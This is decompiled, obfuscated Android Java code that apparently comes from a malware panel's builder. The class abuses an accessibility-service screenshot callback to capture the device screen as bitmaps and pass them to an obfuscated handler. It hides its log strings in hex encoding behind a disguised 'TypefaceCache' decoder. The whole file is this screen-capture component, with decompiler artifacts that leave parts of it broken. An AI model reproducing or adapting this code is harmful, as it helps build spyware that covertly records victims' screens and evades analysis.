package v.s;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class NuEgjpX2tI5BrfFMcX0 implements AccessibilityService.TakeScreenshotCallback {
    public final /* synthetic */ deLJ4Z0aL3hcJ3O1 dDIMxZXP1V8HdM;

    public NuEgjpX2tI5BrfFMcX0(deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1) {
        this.dDIMxZXP1V8HdM = delj4z0al3hcj3o1;
    }

    private static /* synthetic */ void hinxl() {
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onFailure(int i) {
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
        if (delj4z0al3hcj3o1 != null) {
            delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
        }
    }

    /* JADX WARN: Code duplicated, block: B:46:0x007f A[Catch: all -> 0x0034, TRY_LEAVE, TryCatch #9 {all -> 0x0034, blocks: (B:14:0x002c, B:16:0x0030, B:27:0x0044, B:29:0x0048, B:30:0x004b, B:44:0x0070, B:46:0x007f, B:51:0x008b, B:53:0x009d), top: B:82:0x0005 }] */
    /* JADX WARN: Code duplicated, block: B:53:0x009d A[Catch: all -> 0x0034, TRY_LEAVE, TryCatch #9 {all -> 0x0034, blocks: (B:14:0x002c, B:16:0x0030, B:27:0x0044, B:29:0x0048, B:30:0x004b, B:44:0x0070, B:46:0x007f, B:51:0x008b, B:53:0x009d), top: B:82:0x0005 }] */
    /* JADX WARN: Code duplicated, block: B:72:0x0084 A[EXC_TOP_SPLITTER, PHI: r6
      0x0084: PHI (r6v7 android.graphics.Bitmap) = (r6v6 android.graphics.Bitmap), (r6v8 android.graphics.Bitmap) binds: [B:54:0x00a0, B:47:0x0082] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r6v3 */
    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) throws Throwable {
        Bitmap bitmapWrapHardwareBuffer;
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1;
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o2;
        HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
        try {
            try {
                try {
                    try {
                        try {
                            DataQFAdapter.Companion.getClass();
                            Bitmap bitmap = DataQFAdapter.prevHwBitmap;
                            if (bitmap != null) {
                                bitmap.recycle();
                            }
                            DataQFAdapter.prevHwBitmap = null;
                            try {
                                HardwareBuffer hardwareBuffer2 = DataQFAdapter.prevHardwareBuffer;
                                if (hardwareBuffer2 != null) {
                                    hardwareBuffer2.close();
                                }
                            } catch (Exception unused) {
                            }
                            DataQFAdapter.prevHardwareBuffer = null;
                            bitmapWrapHardwareBuffer = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                            try {
                                if (bitmapWrapHardwareBuffer == null) {
                                    deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o3 = this.dDIMxZXP1V8HdM;
                                    if (delj4z0al3hcj3o3 != null) {
                                        delj4z0al3hcj3o3.pyu8ovAipBTLYAiKab(null);
                                    }
                                    try {
                                        hardwareBuffer.close();
                                        return;
                                    } catch (Throwable unused2) {
                                        return;
                                    }
                                }
                                deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o4 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o4 != null) {
                                    delj4z0al3hcj3o4.pyu8ovAipBTLYAiKab(bitmapWrapHardwareBuffer);
                                }
                                DataQFAdapter.prevHwBitmap = bitmapWrapHardwareBuffer;
                                DataQFAdapter.prevHardwareBuffer = hardwareBuffer;
                            } catch (Exception e) {
                                e = e;
                                String unused3 = DataQFAdapter.TAG;
                                TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE009600DC00B3002600640055008600FC009D00DB00B3002E0077004B00C700F500AD00C000A80031002C001B");
                                e.getMessage();
                                delj4z0al3hcj3o2 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o2 != null) {
                                    delj4z0al3hcj3o2.pyu8ovAipBTLYAiKab(null);
                                }
                                if (bitmapWrapHardwareBuffer != null) {
                                    try {
                                        bitmapWrapHardwareBuffer.recycle();
                                    } catch (Throwable unused4) {
                                    }
                                }
                                try {
                                    hardwareBuffer.close();
                                } catch (Throwable unused5) {
                                }
                            } catch (OutOfMemoryError e2) {
                                e = e2;
                                String unused6 = DataQFAdapter.TAG;
                                TypefaceCache.obtain("000C0059007600C700F900B1009200A400220066004F009200E200BA00E100A400310073005E008900D900B100C600A200310078005A008B00D200B600C600AA00220066000100C7");
                                e.getMessage();
                                System.gc();
                                delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o1 != null) {
                                    delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
                                }
                                if (bitmapWrapHardwareBuffer != null) {
                                    bitmapWrapHardwareBuffer.recycle();
                                }
                                hardwareBuffer.close();
                            }
                        } catch (Exception e3) {
                            e = e3;
                            bitmapWrapHardwareBuffer = null;
                            String unused7 = DataQFAdapter.TAG;
                            TypefaceCache.obtain("00200077004B009300E500AD00D7009400200064005E008200FE009600DC00B3002600640055008600FC009D00DB00B3002E0077004B00C700F500AD00C000A80031002C001B");
                            e.getMessage();
                            delj4z0al3hcj3o2 = this.dDIMxZXP1V8HdM;
                            if (delj4z0al3hcj3o2 != null) {
                                delj4z0al3hcj3o2.pyu8ovAipBTLYAiKab(null);
                            }
                            if (bitmapWrapHardwareBuffer != null) {
                                bitmapWrapHardwareBuffer.recycle();
                            }
                            hardwareBuffer.close();
                        }
                    } catch (OutOfMemoryError e4) {
                        e = e4;
                        bitmapWrapHardwareBuffer = null;
                        String unused8 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("000C0059007600C700F900B1009200A400220066004F009200E200BA00E100A400310073005E008900D900B100C600A200310078005A008B00D200B600C600AA00220066000100C7");
                        e.getMessage();
                        System.gc();
                        delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
                        if (delj4z0al3hcj3o1 != null) {
                            delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
                        }
                        if (bitmapWrapHardwareBuffer != null) {
                            bitmapWrapHardwareBuffer.recycle();
                        }
                        hardwareBuffer.close();
                    }
                } catch (Throwable th) {
                    th = th;
                    screenshotResult = 0;
                    if (screenshotResult != 0) {
                        try {
                            screenshotResult.recycle();
                        } catch (Throwable unused9) {
                        }
                    }
                    try {
                        hardwareBuffer.close();
                        throw th;
                    } catch (Throwable unused10) {
                        throw th;
                    }
                }
            } catch (Exception e5) {
                e = e5;
            } catch (OutOfMemoryError e6) {
                e = e6;
            }
        } catch (Throwable th2) {
            th = th2;
        }
    }
}
